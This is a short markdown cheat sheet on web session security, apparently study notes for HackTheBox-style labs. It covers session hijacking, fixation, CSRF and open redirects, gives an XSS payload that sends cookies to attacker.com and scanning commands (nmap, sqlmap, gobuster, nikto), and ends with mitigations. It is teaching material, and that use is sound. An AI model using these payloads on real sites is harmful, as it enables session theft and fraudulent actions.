# Session Security Guide

## 1. Introduction to Sessions

### 1.1 Stateless HTTP

HTTP is stateless; each request is independent. Sessions maintain user state across requests.

### 1.2 Session Identifiers (Session IDs)

* Unique tokens identifying a user session.
* Stored in cookies, URL parameters, or HTML.
* Each method has specific security considerations.

### 1.3 Session ID Security Best Practices

* Uniqueness
* Strong randomness
* Expiration after reasonable time

## 2. Common Session Attacks

### 2.1 Session Hijacking

```bash
curl -b "sessionid=captured_session_id" https://target.com/protected_page
```

### 2.2 Session Fixation

```bash
curl -b "sessionid=attacker_session_id" https://target.com/
```

### 2.3 XSS Session Theft

```html
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

```bash
curl "https://target.com/page?param=<script>alert(1)</script>"
```

### 2.4 CSRF

```html
<form action="https://target.com/transfer" method="POST">
  <input type="hidden" name="account" value="attacker_account">
  <input type="hidden" name="amount" value="1000">
</form>
```

```bash
curl -X POST -d "account=attacker_account&amount=1000&csrf_token=known_token" https://target.com/transfer
```

### 2.5 Open Redirects

```bash
curl -i "https://target.com/redirect?url=https://attacker.com"
```

```bash
wfuzz -c -z file,redirect_urls.txt https://target.com/redirect?url=FUZZ
```

## 3. /etc/hosts Manipulation for Labs

### 3.1 Adding Entries

```bash
echo "<TARGET_IP> target.com" | sudo tee -a /etc/hosts
```

```bash
IP="<TARGET_IP>"
echo -e "$IP\txss.htb.net\n$IP\tcsrf.htb.net\n$IP\toredirect.htb.net\n$IP\tminilab.htb.net" | sudo tee -a /etc/hosts
```

### 3.2 Viewing and Editing

```bash
cat /etc/hosts
sudo nano /etc/hosts
sudo vim /etc/hosts
```

## 4. Essential Security Tools

### 4.1 Nmap

```bash
nmap -sV -sC https://target.com
```

### 4.2 Gobuster

```bash
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

### 4.3 SQLmap

```bash
sqlmap -u "https://target.com/page.php?id=1" --dbs
```

### 4.4 Nikto

```bash
nikto -h https://target.com
```

### 4.5 Burp Suite

* Intruder
* Repeater
* Scanner

## 5. Mitigation

* Use strong, random session IDs.
* Set HTTPOnly and Secure cookie flags.
* Implement CSRF tokens.
* Validate and sanitize input.
* Use output encoding.
* Regenerate session IDs after login or sensitive actions.
* Implement session timeouts.
* Enforce HTTPS.
* Consider a WAF.
